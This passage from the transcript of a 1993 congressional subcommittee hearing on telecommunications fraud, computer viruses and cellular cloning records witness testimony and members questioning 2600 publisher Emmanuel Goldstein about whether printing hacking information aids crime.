criminals abuse these systems not only for free service but for a
variety of crimes ranging from harassment to grand larceny and
illegal wiretapping. Corporate and Government espionage rely on the
user-friendly networks which connect universities, military
institutions, Government offices, corporate research and
development computers. Information theft is common from those
companies which hold our credit histories. Their lack of security
endanger each of us, but they are not held accountable.
     One activity which has had a financial impact on everyone
present is the proliferation of call sell operations. Using a
variety of methods, such as rechipped cellular telephones,
compromised PBX remote access units, or a combination of cellular
phone and international conference lines, the entrepreneur deprives
the telephone companies of hundreds of millions of dollars each
year. These losses are passed on to each of us as higher rates.
     The horrible PBX problem exists because a few dozen finger
hackers crack the codes and disseminate them to those who control
the pay phones. The major long distance carriers each have the
ability to monitor their 800 service lines for sudden peaks in use.
A concerted effort should be made by the long distance carriers to
identify the finger hackers, have the local telephone companies
monitor the necessary dialed number recorders, and provide local
law enforcement with timely affidavits. Those we have arrested for
finger hacking the PBX&#039;s have not gone back into this type of
activity or crime.
     The New York State Police have four newly trained
investigators assigned to investigate telecommunications fraud in
New York City alone. One new program sponsored by AT&amp;T is
responsible for having trained police officers from over 75
departments about this growing blight in New York State alone.
     Publications, such as &quot;2600,&quot; which teach subscribers how to
commit telecommunications crime are protected by the First
Amendment, but disseminating pornography to minors is illegal. In
that many of the phone freaks are juveniles, I believe legislation
banning the dissemination to juveniles of manuals on how to commit
crime would be appropriate.
     From a law enforcement perspective, I applaud the proposed
Clipper chip encryption standard which affords individuals
protection of privacy yet enables law enforcement to conduct
necessary court-ordered wiretaps, and with respect to what was
being said in the previous conversation, last year there were over
900 court-ordered wiretaps in the United States responsible for the
seizure of tons of illicit drugs coming into this country, solving
homicides, rapes, kidnappings. If we went to an encryption standard
without the ability for law enforcement to do something about it,
we would have havoc in the United States -- my personal opinion.
     In New York State an individual becomes an adult at 16 years
old and can be prosecuted as such, but if a crime being
investigated is a Federal violation he must be 18 years of age to
be prosecuted. Even in New York State juveniles can be adjudicated
and given relevant punishment, such as community service.
     I believe that funding law enforcement education programs
regarding high-tech crime investigations, as exists at the Federal
Law Enforcement Training Center&#039;s Financial Frauds Institute, is
one of the best tools our Government has to protect its people with
regard to law enforcement.
     Thank you.
     Mr. WYDEN [presiding]. Thank you very much for a very helpful
presentation.
     Let us go next to Mr. Haugh.
     We welcome you. It is a pleasure to have an Oregonian,
particularly an Oregonian who has done so much in this field, with
the subcommittee today. I also want to thank Chairman Markey and
his excellent staff for all their efforts to make your attendance
possible today.
     So, Mr. Haugh, we welcome you, and I know the chairman is
going to be back here in just a moment.
     STATEMENT OF JOHN J. HAUGH
     Mr. HAUGH. Thank you, Mr. Wyden.
     We expended some 9,000 hours, 11 different people, researching
the problem of toll fraud, penetrating telecommunications systems,
and then stealing long distance, leading up to the publication of
our two-volume reference work in mid-1992. We have since spent
about 5,000 additional hours continuing to monitor the problem, and
we come to the table with a unique perspective because we are
vender, carrier, and user independent.
     In the prior panel, the distinguished gentleman from AT&amp;T, for
whom I have a lot of personal respect, made the comment that the
public justifiably is confident that the national wire network is
secure and that the problem is wireless. With all due respect, that
is a laudable goal, but as far as what is going on today, just
practical reality, that comment is simply incorrect, and if the
public truly is confident that the wired network is secure, that
confidence is grossly misplaced.
     We believe 35,000 users will become victimized by toll fraud
this year, 1993. We believe the national problem totals somewhere
between $4 and $5 billion. It is a very serious national problem.
We commend the chairman and this committee for continuing to
attempt to draw public attention and focus on the problem.
     The good news, as we see it, over the last 3 years is that the
severity of losses has decreased. There is better monitoring,
particularly on the part of the long distance carriers, there is
more awareness on the part of users who are being more careful
about monitoring and managing their own systems, as a result of
which the severity of loss is decreasing. That is the good news.
     The bad news is that the frequency is greatly increasing, so
while severity is decreasing, frequency is increasing, and I will
give you some examples. In 1991 we studied the problem from 1988 to
1991 and concluded that the average toll fraud loss was $168,000.
We did a national survey from November of last year to March of
this year, and the average loss was $125,000, although it was
retrospective. Today we think the average loss is $30,000 to
$60,000, which shows a rather dramatic decline.
     The problem is, as the long distance thieves, sometimes called
hackers, are rooted out of one system, one user system, they
immediately hop into another one. So severity is dropping, but
frequency is increasing. Everybody is victimized. You have heard
business users with some very dramatic and very sad tales. The
truth is that everybody is victimized; the users are victimized;
the long distance carriers are victimized; the cellular carriers
are victimized, the operator service providers; the co-cod folks,
the aggregators and resellers are victimized; the LEC&#039;s and RBOC&#039;s,
to a limited extent, are victimized; and the vendors are victimized
by being drawn into the problem.
     Who is at fault? Everybody is at fault. The Government is at
fault. The FCC has taken a no-action, apathetic attitude toward
toll fraud. That Agency is undermanned, it is understaffed, it is
underfunded, it has difficult problems -- no question about that --
but things could and should be done by that Agency that have not
been done.
     The long distance carriers ignored the problem for far too
long, pretended that they could not monitor when, in fact, the
technology was available. They have done an outstanding job over
the last 2 years of getting with it and engaging themselves fully,
and I would say the long distance carriers, at the moment, are
probably the best segment of anyone at being proactive to take care
of the problem.
     Users too often ignored security, ignored their user manuals,
failed to monitor, failed to properly manage. There has been
improvement which has come with the public knowledge of the
problem. CPE venders, those folks who manufactured the systems that
are so easy to penetrate, have done an abysmally poor job of
engineering into the systems security features. They have ignored
security. Their manuals didn&#039;t deal with security. They are
starting to now. They are doing a far better job. More needs to be
done.
     The FCC, in particular, needs to become active. This committee
needs to focus more attention on the problem, jawbone, keep the
heat on the industry, the LEC&#039;s and the RBOC&#039;s in particular. The
LEC&#039;s and the RBOC&#039;s have essentially ignored the problem. They are
outside the loop, they say, yet the LEC&#039;s and the RBOC&#039;s collected
over $21 billion last year in access fees for connecting their
users to the long distance networks. How much of that $21 billion
did the LEC&#039;s and the RBOC&#039;s reinvest in helping to protect their
users from becoming victimized and helping to combat user-targeted
toll fraud? No more than $10 million, one-fifth of 1 percent.
     Many people in the industry feel the LEC&#039;s and the RBOC&#039;s are
the one large group that has yet to seriously come to the table.
Many in the industry -- and we happen to agree -- feel that 3 to 4
percent of those access fees should be reinvested in protecting
users from being targeted by the toll fraud criminals.
     The FCC should become more active. The jawboning there is at
a minimal level. There was one show hearing last October, lots of
promises, no action, no regulation, no initiatives, no meetings. A
lot could be done. Under part 68, for example, the FCC, which is
supposed to give clearance to any equipment before it is connected
into the network, they could require security features embedded
within that equipment. They could prevent things like low-end PBX&#039;s
from being sold with three-digit barrier codes that anyone can
penetrate in 3 to 5 minutes.
     Thank you, Mr. Chairman.
     Mr. MARKEY. THANK YOU, MR. HAUGH, VERY MUCH.
     Mr. Goldstein, let&#039;s go to you next.
     STATEMENT OF EMMANUEL GOLDSTEIN
     Mr. GOLDSTEIN. Thank you, Mr. Chairman, and thank you to this
committee for allowing me the opportunity to speak on behalf of
those who, for whatever reason, have no voice.
     I am in the kind of unique position of being in contact with
those people known as computer hackers throughout the world, and I
think one of the misconceptions that I would like to clear up, that
I have been trying to clear up, is that hackers are analogous to
criminals. This is not the case. I have known hundreds of hackers
over the years, and a very, very small percentage of them are
interested in any way in committing any kind of a crime. I think
the common bond that we all have is curiosity, an intense form of
curiosity, something that in many cases exceeds the limitations
that many of us would like to put on curiosity. The thing is
though, you cannot really put a limitation on curiosity, and that
is something that I hope we will be able to understand.
     I like to parallel the hacker culture with any kind of alien
culture because, as with any alien culture, we have difficulty
understanding its system of values, we have difficulty
understanding what it is that motivates these people, and I hope to
be able to demonstrate through my testimony that hackers are
friendly people, they are curious people, they are not out to rip
people off or to invade people&#039;s privacy; actually, they are out to
protect those things because they realize how valuable and how
precious they really are.
     I like to draw analogies to where we are heading in the world
of high technology, and one of the analogies I have come up with is
to imagine yourself speeding down a highway, a highway that is
slowly becoming rather icy and slippery, and ask yourself the
question of whether or not you would prefer to be driving your own
car or to be somewhere inside a large bus, and I think that is kind
of the question we have to ask ourselves now. Do we want to be in
control of our own destiny as far as technology goes, or do we want
to put all of our faith in somebody that we don&#039;t even know and
maybe fall asleep for a little while ourselves and see where we
wind up? It is a different answer for every person, but I think we
need to be able to at least have the opportunity to choose which it
is that we want to do.
     Currently, there is a great deal of suspicion, a great deal of
resignation, hostility, on behalf of not simply hackers but
everyday people on the street. They see technology as something
that they don&#039;t have any say in, and that is why I particularly am
happy that this committee is holding this hearing, because people,
for the most part, see things happening around them, and they
wonder how it got to that stage. They wonder how credit files were
opened on them; they wonder how their phone numbers are being
passed on through A&amp;I and caller ID. Nobody ever went to these
people and said, &quot;Do you want to do this? Do you want to change the
rules?&quot;
     The thing that hackers have learned is that any form of
technology can and will be abused, whether it be calling card
numbers or the Clipper chip. At some point, something will be
abused, and that is why it is important for people to have a sense
of what it is that they are dealing with and a say in the future.
     I think it is also important to avoid inequities in access to
technology, to create a society of haves and have-nots, which I
feel we are very much in danger of doing to a greater extent than
we have ever done before. A particular example of this involves
telephone companies, pay phones to be specific. Those of us who can
make a telephone call from, say, New York to Washington, D.C., at
the cheapest possible rate from the comfort of our own homes will
pay about 12 cents for the first minute. However, if you don&#039;t have
a phone or if you don&#039;t have a home, you will be forced to pay
$2.20 for that same first minute.
     What this has led to is the proliferation of what are known as
red boxes. I have a sample (indicating exhibit). Actually, this is
tremendously bigger than it needs to be. A red box can be about a
tenth of the size of this. But just to demonstrate the sound that
it takes for the phone company to believe that you have put a
quarter into the phone (brief tone is played), that is it, that is
a quarter.
     Now we can say this is the problem, this huge demonic device
here is what is causing all the fraud, but it is not the case. This
tape recorder here (same brief tone is played) does the same thing.
So now we can say the tones are the problem, we can make tones
illegal, but that is going to be very hard to enforce.
     I think what we need to look at is the technology itself: Why
are there gaping holes in them? and why are we creating a system
where people have to rip things off in order to get the same access
that other people can get for virtually nothing?
     I think a parallel to that also exists in the case of cellular
phones. I have a device here (indicating exhibit) which I won&#039;t
demonstrate, because to do so would be to commit a Federal crime,
but by pressing a button here within the course of 5 seconds we
will be able to hear somebody&#039;s private, personal cellular phone
call.
     Now the way of dealing with privacy with cellular phone calls
is to make a law saying that it is illegal to listen. That is the
logic we have been given so far. I think a better idea would be to
figure out a way to keep those cellular phone calls private and to
allow people to exercise whatever forms of privacy they need to
have on cellular phone calls.
     So I think we need to have a better understanding both from
the legislative point of view and in the general public as far as
technology in itself, and I believe we are on the threshold of a
very positive, enlightened period, and I see that particularly with
things like the Internet which allow people access to millions of
other people throughout the world at very low cost. I think it is
the obligation of all of us to not stand in the way of this
technology, to allow it to go forward and develop on its own, and
to keep a watchful eye on how it develops but at the same time not
prevent it through overlegislation or overpricing.
     Thank you very much for the opportunity to speak.
     Mr. MARKEY. Thank you, Mr. Goldstein.
     Dr. Tippett.
     STATEMENT OF PETER S. TIPPETT
     Mr. TIPPET. Thank you.
     I am Peter Tippett from Symantec Corporation, and today I am
also representing the National Computer Security Association and
the Computer Ethics Institute. Today is Computer Virus Awareness
Day, in case you are not aware, and we can thank Jack Fields,
Representative Fields, for sponsoring that day on behalf of the
Congress, and I thank you for that.
     We had a congressional briefing this morning in which nine
representatives from industry, including telecommunications and
aerospace and the manufacturing industry, convened, and for the
first time were willing to talk about their computer virus problems
in public. I have got to tell you that it is an interesting
problem, this computer virus problem. It is a bit different from
telephone fraud. The virus problem is one which has probably among
the most misrepresentation and misunderstanding of these various
kinds of fraud that are going on, and I would like to highlight
that a little bit. But before I do, I would like to suggest what we
know to be the costs of computer viruses just in America.
     The data I am representing comes from IBM and DataQuest, a
Dunn and Bradstreet company, it is the most conservative
interpretation you could make from this data. It suggests that a
company of only a thousand computers has a virus incident every
quarter, that a typical Fortune 500 company deals with viruses
every month, that the cost to a company with only a thousand
computers is about $170,000 a year right now and a quarter of a
million dollars next year. If we add these costs up, we know that
the cost to United States citizens of computer viruses just so far,
just since 1990, exceeds $1 billion.
     When I go through these sorts of numbers, most of us say,
well, that hype again, because the way the press and the way we
have heard about computer viruses has been through hype oriented
teachings. So the purpose here is not to use hype and not to sort
of be alarmist and say the world is ending, because the world isn&#039;t
ending per se, but to suggest that there isn&#039;t a Fortune 500
company in the United States who hasn&#039;t had a computer virus
problem is absolutely true, and the sad truth about these viruses
is that the misconceptions are keeping us from doing the right
things to solve the problem, and the misconceptions stem from the
fact that companies that are hit by computer viruses, which is
every company, refused to talk about that until today.
     There are a couple of other unique things and misconceptions
about computer viruses. One is that bulletin boards are the leading
source of computer viruses. Bulletin boards represent the infancy
of the superhighway, I think you could say, and there are a lot of
companies that make rules in their company that you are not allowed
to use bulletin boards because you might get a virus. In fact, it
is way in the low, single-digit percents. It may be as low as 1
percent of computer viruses that are introduced into companies come
through some route via a bulletin board.
     We are told that some viruses are benign, and, in fact, most
people who write computer viruses think that their particular virus
is innocuous and not harmful. It turns out that most virus authors,
as we just heard from Mr. Goldstein, are, in fact, curious people
and not malicious people. They are young, and they are challenged,
and there is a huge game going on in the world. There is a group of
underground virus bulletin boards that we call virus exchange
bulletin boards in which people are challenged to write viruses.
     The challenge works like this: If you are interested and
curious, you read the threads of communication on these bulletin
boards, and they say, you know, &quot;If you want to download some
viruses, there&#039;s a thousand here on the bulletin board free for
your downloading,&quot; but you need points. Well, how do you get
points? Well, you upload some viruses. Well, where do you get some
viruses from? If you upload the most common viruses, they are not
worth many points, so you have to upload some really good, juicy
viruses. Well, the only way to get those is to write them, so you
write a virus and upload your virus, and then you gain acceptance
into the culture, and when you gain acceptance into the culture you
have just added to the problem.
     It is interesting to know that the billion dollars that we
have spent since 1990 on computer viruses just in the United States
is due to viruses that were written in 1988 and 1987. Back then, we
only had one or two viruses a quarter, new, introduced into the
world. This year we have a thousand new computer viruses introduced
into our community, and it won&#039;t be for another 4 or 5 years before
these thousand viruses that are written now will become the major
viruses that hurt us in the future.
     So virus authors don&#039;t believe they are doing anything wrong,
they don&#039;t believe that they are being harmful, and they don&#039;t
believe that what they do is dangerous, and, in fact, all viruses
are.
     Computer crime laws don&#039;t have anything to do with computer
virus writers, so we heard testimony this morning from Scott
Charney of the Department of Justice who suggested that authorized
access is the biggest law you could use, and, in fact, most viruses
are brought into our organizations in authorized ways, because
users who are legitimate in the organizations accidentally bring
these things in, and then they infect our companies.
     In summary, I think that we need to add a little bit of
specific wording in our computer crime legislation that relates
particularly to computer viruses and worms. We need, in particular,
to educate. We need to go after an ethics angle. We need to get to
the point where Americans think that writing viruses or doing these
other kinds of things that contaminate our computer superhighways
are akin to contaminating our expressways.
     In the sixties we had a big &quot;Keep America Beautiful&quot; campaign,
and most Americans would find it unthinkable to throw their garbage
out the window of their car, but we don&#039;t think it unthinkable to
write rogue programs that will spread around our highway.
     Thank you.
     Mr. MARKEY. Thank you, Dr. Tippett.
     Mr. Guidry.
     STATEMENT OF MICHAEL A. GUIDRY
     Mr. GUIDRY. Thank you, Mr. Chairman, for giving me the
opportunity to appear before this subcommittee, and thank you,
subcommittee, for giving me this opportunity.
     The Guidry Group is a Houston-based security consulting firm
specializing in telecommunication issues. We started working in
telecommunication issues in 1987 and started working specifically
with the cellular industry at that time. When we first started, we
were working with the individual carriers across the United States,
looking at the hot points where fraud was starting to occur, which
were major metropolitan cities of course.
     In 1991, the Cellular Telephone Industry Association contacted
us and asked us to work directly with them in their fight against
cellular fraud. The industry itself has grown, as we all know,
quite rapidly. However, fraud in the industry has grown at an
unbelievable increase, actually faster than the industry itself,
and as a result of that fraud now is kind of like a balloon, a
water balloon; it appears in one area, and when we try to stamp it
out it appears in another area.
     As a result, what has happened is, when fraud first started,
there was such a thing as subscription fraud, the same type of
fraud that occurred with the land line telecommunication industry.
That subscription fraud quickly changed. Now what has occurred is,
technology has really stepped in.
     First, hackers, who are criminals or just curious people,
would take a telephone apart, a cellular phone apart, and change
the algorithm on the chip, reinsert the chip into the telephone,
and cause that telephone to tumble. Well, the industry put its best
foot forward and actually stopped, for the most part, the act of
tumbling in cellular telephones. But within the last 18 months
something really terrible has happened, and that is cloning.
     Cloning is the copying of the MIN and and ESN number, and, for
clarification, the MIN is the Mobile Identification Number that is
assigned to you by the carrier, and the ESN number is the
Electronic Cellular Number that is given to the cellular telephone
from that particular manufacturer. As a result, now we have
perpetrators, or just curious people, finding ways to copy the MIN
and the ESN, thereby victimizing the cellular carrier as well as
the good user, paying subscriber. This occurs when the bill is
transmitted by the carrier to the subscriber and he says something
to the effect of, &quot;I didn&#039;t realize that I had made $10,000 worth
of calls to the Dominican Republic,&quot; or to Asia or Nicaragua or
just any place like that.
     Now what has happened is, those clone devices have been placed
in the hands of people that we call ET houses, I guess you would
say, and they are the new immigrants that come into the United
States for the most part that do not have telephone subscriptions
on the land line or on the carrier side from cellular, and now they
are charged as much as $25 for 15 minutes to place a call to their
home.
     Unfortunately, though, the illicit behavior of criminals has
stepped into this network also. Now we have gang members, drug
dealers, and gambling, prostitution, vice, just all sorts of crime,
stepping forward to use this system where, by using the cloning,
they are avoiding law enforcement. Law enforcement has problems, of
course, trying to find out how to tap into those telephone systems
and record those individuals.
     Very recently, cloning has even taken a second step, and that
is now something that we term the magic phone, and the magic phone
works like this: Instead of cloning just one particular number, it
clones a variety of numbers, as many as 14 or 66, thereby
distributing the fraud among several users, which makes it almost
virtually impossible for us to detect at an early stage.
     In response to this, what has happened? A lot of legitimate
people have started to look at using the illegitimate cellular
services. They are promised that this is a satellite phone or just
a telephone that if they pay a $2,500 fee will avoid paying further
bills. So now it has really started to spread.
     Some people in major metropolitan areas, such as the
Southwest, Northeast, and Southeast, have started running their own
mini-cellular companies by distributing these cloning phones to
possible clients and users, collecting the fee once a month to
reactivate the phone if it is actually denied access.
     The cellular industry has really stepped up to the plate I
think the best they can right now in trying to combat this by
working with the switch manufacturers and other carriers, 150 of
them to date with the cellular telephone industry, as well as the
phone manufacturers, and a lot of companies have started looking at
software technology. However, these answers will not come to pass
very soon. What we must have is strong legislation.
     We have been working for the last 18 months, specifically with
the Secret Service and a lot of local, State, and Federal law
enforcement agencies. The Service has arrested over 100 people
involved in cellular fraud. We feel very successful about that. We
also worked with local law enforcement in Los Angeles to form the
L.A. Blitz, and we arrested an additional 26 people and seized 66
illegal telephones and several computers that spread this cloning
device.
     However, now we have a problem. U.S. Title 18, 1029, does not
necessarily state cellular or wireless. It is very important, and
I pray that this committee will look at revising 1029 and changing
it to include wireless and cellular. I think wireless
communications, of course, like most people, is the wave of the
future, and it is extremely important that we include that in the
legislation so that when people are apprehended they can be
prosecuted.
     Thank you, sir.
     Mr. MARKEY. Thank you, Mr. Guidry, very much.
     We will take questions now from the subcommittee members.
     Let me begin, Mr. Delaney. I would like you and Mr. Goldstein
to engage in a conversation, if we could. This is Mr. Goldstein&#039;s
magazine, &quot;The Hacker Quarterly: 2600,&quot; and for $4 we could go out
to Tower Records here in the District of Columbia and purchase
this. It has information in it that, from my perspective, is very
troubling in terms of people&#039;s cellular phone numbers and
information on how to crack through into people&#039;s private
information.
     Now you have got some problems with &quot;The Hacker Quarterly,&quot;
Mr. Delaney.
     Mr. DELANEY. Yes, sir.
     Mr. MARKEY. And your problem is, among other things, that
teenagers can get access to this and go joy riding into people&#039;s
private records.
     Mr. DELANEY. Yes, sir. In fact, they do.
     Mr. MARKEY. Could you elaborate on what that problem is?
     And then, Mr. Goldstein, I would like for you to deal with the
ethical implications of the problem as Mr. Delaney would outline
them.
     Mr. DELANEY. Well, the problem is that teenagers do read the
&quot;2600&quot; magazine. I have witnessed teenagers being given free copies
of the magazine by the editor-in-chief. I have looked at a
historical perspective of the articles published in &quot;2600&quot; on how
to engage in different types of telecommunications fraud, and I
have arrested teenagers that have read that magazine.
     The publisher, or the editor-in-chief, does so with impunity
under the cloak of protection of the First Amendment. However, as
I indicated earlier, in that the First Amendment has been abridged
for the protection of juveniles from pornography, I also feel that
it could be abridged for juveniles being protected from manuals on
how to commit crime -- children, especially teenagers, who are
hackers, and who, whether they be mischievous or intentionally
reckless, don&#039;t have the wherewithal that an adult does to
understand the impact of what he is doing when he gets involved in
this and ends up being arrested for it.
     Mr. MARKEY. Mr. Goldstein, how do we deal with this problem?
     Mr. GOLDSTEIN. First of all, &quot;2600&quot; is not a manual for
computer crime. What we do is, we explain how computers work. Very
often knowledge can lead to people committing crimes, we don&#039;t deny
that, but I don&#039;t believe that is an excuse for withholding the
knowledge.
     The article on cellular phones that was printed in that
particular issue pretty much goes into detail as to how people can
track a cellular phone call, how people can listen in, how exactly
the technology works. These are all things that people should know,
and perhaps if people had known this at the beginning they would
have seen the security problems that are now prevalent, and perhaps
something could have been done about it at that point.
     Mr. MARKEY. Well, I don&#039;t know. You are being a little bit
disingenuous here, Mr. Goldstein. Here, on page 17 of your spring
edition of 1993, &quot;How to build a pay TV descrambler.&quot; Now that is
illegal.
     Mr. GOLDSTEIN. Not building. Building one is not illegal.
     Mr. MARKEY. Oh, using one is illegal?
     Mr. GOLDSTEIN. Exactly.
     Mr. MARKEY. I see. So showing a teenager, or anyone, how to
build a pay TV descrambler is not illegal. But what would they do
then, use it as an example of their technological prowess that they
know how to build one? Would there not be a temptation to use it,
Mr. Goldstein?
     Mr. GOLDSTEIN. It is a two-way street, because we have been
derided by hackers for printing that information and showing the
cable companies exactly what the hackers are doing.
     Mr. MARKEY. I appreciate it from that perspective, but let&#039;s
go over to the other one. If I am down in my basement building a
pay TV descrambler for a week, am I not going to be tempted to see
if it works, Mr. Goldstein? Or how is it that I then prove to
myself and my friends that I have actually got something here which
does work in the real world?
     Mr. GOLDSTEIN. It is quite possible you will be tempted to try
it out. We don&#039;t recommend people being fraudulent --
     Mr. MARKEY. How do you know that it works, by the way?
     Mr. GOLDSTEIN. Actually, I have been told by most people that
is an old version that most cable companies have gotten beyond.
     Mr. MARKEY. So this wouldn&#039;t work then?
     Mr. GOLDSTEIN. It will work in some places, it won&#039;t work in
all places.
     Mr. MARKEY. Oh, it would work? It would work in some places?
     Mr. GOLDSTEIN. Most likely, yes. But the thing is, we don&#039;t
believe that because something could be used in a bad way, that is
a reason to stifle the knowledge that goes into it.
     Mr. MARKEY. That is the only way this could be used. Is there
a good way in which a pay TV descrambler could be used that is a
legal way?
     Mr. GOLDSTEIN. Certainly, to understand how the technology
works in the first place, to design a way of defeating such devices
in the future or to build other electronic devices based on that
technology.
     Mr. MARKEY. I appreciate that, but it doesn&#039;t seem to me that
most of the subscribers to &quot;2600&quot; magazine --
     Mr. GOLDSTEIN. That is interesting that you are pointing to
that. That is our first foray into cable TV. We have never even
testified on the subject before.
     Mr. MARKEY. I appreciate that.
     Well, let&#039;s move on to some of your other forays here. What
you have got here, it seems to me, is a manual where you go down
Maple Street and you just kind of try the door on every home on
Maple Street. Then you hit 216 Maple Street, and the door is open.
What you then do is, you take that information, and you go down to
the corner grocery store, and you post it: &quot;The door of 216 Maple
is open.&quot;
     Now, of course, you are not telling anyone to steal, and you
are not telling anyone that they should go into 216 Maple. You are
assuming that everyone is going to be ethical who is going to use
this information, that the house at 216 Maple is open. But the
truth of the matter is, you have got no control at this point over
who uses that information. Isn&#039;t that true, Mr. Goldstein?
     Mr. GOLDSTEIN. The difference is that a hacker will never
target an individual person as a house or a personal computer or
something like that. What a hacker is interested in is wide open,
huge data bases that contain information about people, such as TRW.
     A better example, I feel, would be one that we tried to do 2
years ago where we pointed out that the Simplex Lock Corporation
had a very limited number of combinations on their hardware locks
that they were trying to push homeowners to put on their homes, and
we tried to alert everybody as to how insecure these are, how easy
it is to get into them, and people were not interested.
     Hackers are constantly trying to show people how easy it is to
do certain things.
     Mr. MARKEY. I appreciate what you are saying. From one
perspective, you are saying that hackers are good people out there,
almost like -- what are they called? -- the Angels that patrol the
subways of New York City.
     Mr. GOLDSTEIN. Guardian Angels. I wouldn&#039;t say that though.
     Mr. MARKEY. Yes, the Guardian Angels, just trying to protect
people.
     But then Mr. Delaney here has the joy riders with the very
same information they have taken off the grocery store bulletin
board about the fact that 216 Maple is wide open, and he says we
have got to have some laws on the books here to protect against it.
     So would you mind if we passed, Mr. Goldstein, trespassing
laws that if people did, in fact, go into 216 and did do something
wrong, that we would be able to punish them legally? Would you have
a problem with that?
     Mr. GOLDSTEIN. I would be thrilled if computer trespassing
laws were enforced to the same degree as physical trespassing laws,
because then you would not have teenage kids having their doors
kicked in by Federal marshals and being threatened with $250,000
fines, having all their computer equipment taken and having guns
pointed at them. You would have a warning, which is what you get
for criminal trespass in the real world, and I think we need to
balance out the real world --
     Mr. MARKEY. All right. So you are saying, on the one hand, you
have a problem that you feel that hackers are harassed by law
enforcement officials and are unduly punished. We will put that on
one side of the equation. But how about the other side? How about
where hackers are violating people&#039;s privacy? What should we do
there, Mr. Goldstein?
     Mr. GOLDSTEIN. When a hacker is violating a law, they should
be charged with violating a particular law, but that is not what I
see today. I see law enforcement not having a full grasp of the
technology. A good example of this was raids on people&#039;s houses a
couple of years ago where in virtually every instance a Secret
Service agent would say, &quot;Your son is responsible for the AT&amp;T
crash on Martin Luther King Day,&quot; something that AT&amp;T said from the
beginning was not possible.
     Mr. MARKEY. Again, Mr. Goldstein, I appreciate that. Let&#039;s go
to the other side of the problem, the joy rider or the criminal
that is using this information. What penalties would you suggest to
deal with the bad hacker? Are there bad hackers?
     Mr. GOLDSTEIN. There are a few bad hackers. I don&#039;t know any
myself, but I&#039;m sure there are.
     Mr. MARKEY. I assume if you knew any, you would make sure we
did something about them. But let&#039;s just assume there are bad
people subscribing. What do we do about the bad hacker?
     Mr. GOLDSTEIN. Well, I just would like to clarify something.
We have heard here in testimony that there are gang members and
drug members who are using this technology. Now, are we going to
define them as hackers because they are using the technology?
     Mr. MARKEY. Yes. Well, if you want to give them another name,
fine. We will call them hackers and crackers, all right?
     Mr. GOLDSTEIN. I think we should call them criminals.
     Mr. MARKEY. So the crackers are bad hackers, all right? If you
want another word for them, that is fine, but you have got the
security of individuals decreasing with the sophistication of each
one of these technologies, and the crackers are out there. What do
we do with the crackers who buy your book?
     Mr. GOLDSTEIN. I would not call them crackers. They are
criminals. If they are out there doing something for their own
benefit, selling information --
     Mr. MARKEY. Criminal hackers. What do we do with them?
     Mr. GOLDSTEIN. There are existing laws. Stealing is still
stealing.
     Mr. MARKEY. OK. Fine.
     Dr. Tippett.
     Mr. TIPPETT. I think that the information age has brought on
an interesting dilemma that I alluded to earlier. The dilemma is
that the people who use computers don&#039;t have parents who used
computers, and therefore they didn&#039;t get the sandbox training on
proper etiquette. They didn&#039;t learn you are not supposed to spit in
other people&#039;s faces or contaminate the water that we drink, and we
have a whole generation now of 100 million in the United States
computer users, many of whom can think this through themselves,
but, as we know, there is a range of people in any group, and we
need to point out the obvious to some people. It may be the bottom
10 percent.
     Mr. MARKEY. What the problem is, of course, is that the
computer hacker of today doesn&#039;t have a computer hacker parent, so
parents aren&#039;t teaching their children how to use their computers
because parents don&#039;t know how to use computers. So what do we do?
     Mr. TIPPETT. It is incumbent upon us to do the same kind of
thing we did in the sixties to explain that littering wasn&#039;t right.
It is incumbent upon us to take an educational stance and for
Congress to credit organizations, maybe through a tax credit or
through tax deductions, for taking those educational opportunities
and educating the world of people who didn&#039;t have sandbox training
what is good and what is bad about computing.
     So at least the educational part needs to get started, because
I, for one, think that probably 90 percent of the kids -- most of
the kids who do most of the damage that we have all described up
here, in fact, don&#039;t really believe they are doing any damage and
don&#039;t have the concept of the broadness of the problem that they
are doing. The 10 percent of people who are criminal we could go
after potentially from the criminal aspect, but the rest we need to
get after from a plain, straight ahead educational aspect.
     Mr. MARKEY. I appreciate that.
     I will just say in conclusion -- and this is for your benefit,
Mr. Goldstein. When you pass laws, you don&#039;t pass laws for the good
people. What we assume is that there are a certain percent of
people --  5 percent, 10 percent; you pick it -- who really don&#039;t
have a good relationship with society as a whole, and every law
that we pass, for the most part, deals with those people.
     Now, as you can imagine, when we pass death penalty statutes,
we are not aiming it at your mother and my mother. It is highly
unlikely they are going to be committing a murder in this lifetime.
But we do think there is a certain percentage that will. It is a
pretty tough penalty to have, but we have to have some penalty that
fits the crime.
     Similarly here, we assume that there is a certain percentage
of pathologically damaged people out there. The cerebral mechanism
doesn&#039;t quite work in parallel with the rest of society. We have to
pass laws to protect the rest of us against them. We will call them
criminal hackers. What do we do to deal with them is the question
that we are going to be confronted with in the course of our
hearings?
     Let me recognize the gentleman from Texas, Mr. Fields.
     Mr. FIELDS. Thank you, Mr. Chairman.
     Just for my own edification, Mr. Goldstein, you appear to be
intelligent; you have your magazine, so obviously you are
entrepreneurial. For me personally, I would like to know, why don&#039;t
you channel the curiosity that you talk about into something that
is positive for society? And, I&#039;m going to have to say to you, I
don&#039;t think it is positive when you invade someone else&#039;s privacy.
     Mr. GOLDSTEIN. I agree.
     Mr. FIELDS. Whether it is an individual or a corporation.
     Mr. GOLDSTEIN. Well, I would like to ask a question in return
then. If I discover that a corporation is keeping a file on me and
I access that corporation&#039;s computer and find out or tell someone
else, whose privacy am I invading? Or is the corporation invading
my privacy?
     You see, corporations are notorious for not volunteering such
information: &quot;By the way, we are keeping files on most Americans
and keeping track of their eating habits and their sexual habits
and all kinds of other things.&quot; Occasionally, hackers stumble on to
information like that, and you are much more likely to get the
truth out of them because they don&#039;t have any interest to protect.
     Mr. FIELDS. Are you saying with this book that is what you are
trying to promote? because when I look through this book, I find
the same thing that the chairman finds, some things that could
actually lead to criminal behavior, and when I see all of these
codes regarding cellular telephones, how you penetrate and listen
to someone&#039;s private conversation, I don&#039;t see where you are doing
anything for the person, the person who is actually doing the
hacking. I see that as an invasion of privacy.
     Mr. GOLDSTEIN. All right. I need to explain something then.
Those are not codes, those are frequencies. Those are frequencies
that anybody can listen to, and by printing those frequencies we
are demonstrating how easy it is for anybody to listen to them.
     Now if I say that by tuning to 871 megahertz you can listen to
a cellular phone call, I don&#039;t think I am committing a crime, I
think I am explaining to somebody. What I have done at previous
conferences is hold up this scanner and press a button and show
people how easy it is to listen, and those people, when they get
into their cars later on in the day, they do not use their cellular
telephones to make private calls of a personal nature because they
have learned something, and that is what we are trying to do, we
are trying to show people how easy it is.
     Now, yes, that information can be used in a bad way, but to
use that as an excuse not to give out the information at all is
even worse, and I think it is much more likely that things may be
fixed, the cellular industry may finally get its act together and
